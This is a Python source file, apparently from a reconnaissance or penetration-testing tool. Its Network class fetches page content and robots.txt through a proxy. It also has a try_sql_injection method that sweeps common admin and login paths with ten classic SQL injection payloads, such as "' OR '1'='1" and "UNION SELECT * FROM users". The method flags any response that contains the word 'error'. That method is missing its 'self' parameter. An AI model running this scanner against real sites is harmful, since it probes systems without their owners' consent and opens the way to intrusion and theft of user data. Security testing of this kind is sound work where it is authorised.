import requests

from helper import *

class Network:
    def get_content(self, address, proxy, d_ipv4):
        try:
            if d_ipv4 and bool(re.match(d_ipv4, address)):
                address = get_domain(address)
            r = requests.get(f"http://{address}", proxies=proxy.proxy)
            if r.status_code == 200:
                print(f"\n{r.content.strip()}")
            else:
                print(f"There was an error while to fetch the content of {address}, code: {r.status_code}")
        except requests.exceptions.SSLError:
            print(f"An SSL error occourred while trying to fetch the content of {address}")
            
    def get_robots(self, target, proxy):
        try:
            r = requests.get(f"http://{target}/robots.txt", proxies=proxy)
            if "404" not in r.text:
                print(f"\n{r.text}")
            else:
                print(f"Unable to fetch robots.txt: file not found in {target}")
        except requests.exceptions.MissingSchema:
            print(f"Unable to fetch robots.txt: file not found in {target}")
            
    def try_sql_injection(target, proxy):
        extensions = ["", ".html", ".htm", ".asp", ".aspx", ".jsp", ".php", ".jspx"]
        directories = ["", "admin", "login", "wp-admin", "cms", "panel", "dashboard", "config", "includes"]
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT * FROM users --",
            "' AND 1=1 --",
            "' OR 1=1 --",
            "1' OR '1'='1",
            "1' UNION SELECT * FROM users --",
            "1' AND 1=1 --",
            "1' OR '1'='1 --",
            "1' OR 1=1 --"
        ]

        succeeded = False
        for d in directories:
            for ext in extensions:
                url = f"{target}/{d}{ext}"
                for payload in payloads:
                    try:
                        response = requests.get(f"{url}?id={payload}", timeout=5, proxies=proxy)
                        if "error" in response.text.lower():
                            print(f"[!] Possible SQL injection vulnerability found on {url} with payload: {payload}")
                            print(f"Response: {response.text[:200]}...")
                            succeeded = True
                        else:
                            print(f"[+] No SQL injection detected on {url} with payload: {payload}")
                    except requests.exceptions.RequestException as e:
                        continue
                        
        if not succeeded:
            print("None of the common sql injection payloads worked")